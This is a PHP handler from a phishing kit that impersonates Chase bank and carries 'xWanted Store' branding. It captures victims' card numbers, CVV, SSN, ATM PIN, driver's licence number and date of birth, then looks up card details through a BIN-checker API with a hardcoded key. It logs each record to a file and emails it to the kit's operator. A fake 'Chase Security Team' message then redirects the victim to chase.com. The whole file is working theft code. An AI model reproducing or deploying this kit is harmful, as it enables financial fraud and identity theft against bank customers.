<?php
if (isset($_POST['ccn']) && isset($_POST['ssn'])) {
    session_start();
    include '../mine.php';
    $ctp         = $_POST['ctp'];
    $ccn         = $_POST['ccn'];
    $cex         = $_POST['mnt'] . '/' . $_POST['yer'];
    $csc         = $_POST['csc'];
    $ssn         = $_POST['ssn'];
    $atm         = $_POST['atm'];
    $mtr         = $_POST['mtr'];
    $dob         = $_POST['dob'];
    $bin=substr(str_replace(' ','',$ccn),0,6);  
  		$ch=curl_init();
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://api.bincodes.com/bin-checker.php?api_key=93648770a4bf19f8efb367239cb8b8c1&bin=".$bin."&format=json");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		$code=json_decode($json);
		$bin_scheme = $code->card;
		$bin_bank = $code->bank;
		$bin_type = $code->type;
		$bin_brand = $code->level;
		$bin_countrycode = $code->countrycode;
		$bin_url = parse_url(strtolower($code->website));
		$bin_phone = strtolower($code->phone);
		$bin_country = $code->country;
    $msg         = "=========== <[ Chase ]> ===========\r\n";
    $msg .= "----------------------- CC Info ---------------------\r\n";
    $msg .= "CC Brand   : {$ctp}\r\n";
    $msg .= "CC Number  : {$ccn}\r\n";
    $msg .= "CC Expiry  : {$cex}\r\n";
    $msg .= "CVV / CSC  : {$csc}\r\n";
    $msg .= "SSN            : {$ssn}\r\n";
    $msg .= "ATM PIN    : {$atm}\r\n";
    $msg .= "Driver L. N.   : {$mtr}\r\n";
    $msg .= "DOB            : {$dob}\r\n";
    $msg .= "----------------------- BIN Info {$bin} -------------\r\n";
    $msg .= "CC Data        : {$bin_brand} {$bin_type}\r\n";
    $msg .= "CC Bank        : {$bin_bank}\r\n";
    $msg .= "CC Country : {$bin_country}\r\n";
    $msg .= "---------------------- IP Info ----------------------\r\n";
    $msg .= "IP ADDRESS : {$_SESSION['ip']}\r\n";
    $msg .= "LOCATION   : {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "BROWSER        : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "TIMEZONE   : {$_SESSION['ip_timezone']}\r\n";
    $msg .= "TIME       : " . now() . " GMT\r\n";
    $msg .= "=========== <[ xWanted Store ]> ===========\r\n\r\n\r\n";
    $save = fopen("../../".$text.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "CHASE CARD [{$bin} {$ctp}] From [{$_SESSION['ip_countryName']}]";
    $headers = "From: xWanted <sales@xwanted.store>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);
    $nextDate = date("d/m/Y, h:ia", time() + 86400);
    exit('<div style="color:#717171"><h2 style="text-transform:uppercase;text-align:center;color:#717171">Thank You</h2><div style="margin-bottom:20px"> By ' . $nextDate . ' you have verified your account ending in . Your\'re now redirecting to Chase.com and login back. </div>
<div style="margin-bottom:20px"> We are sorry for the inconvenience that this might have caused you. We will update your account within the next 24 hours. </div>
<div><small style="font-size:65%;text-transform:uppercase">Chase Security Team</small>
</div>
<script>
    $("#rotate").hide();
    setTimeout(function() {
        window.location.href = "https://chase.com/"
    }, 6000);
</script>
</div>');
}
?>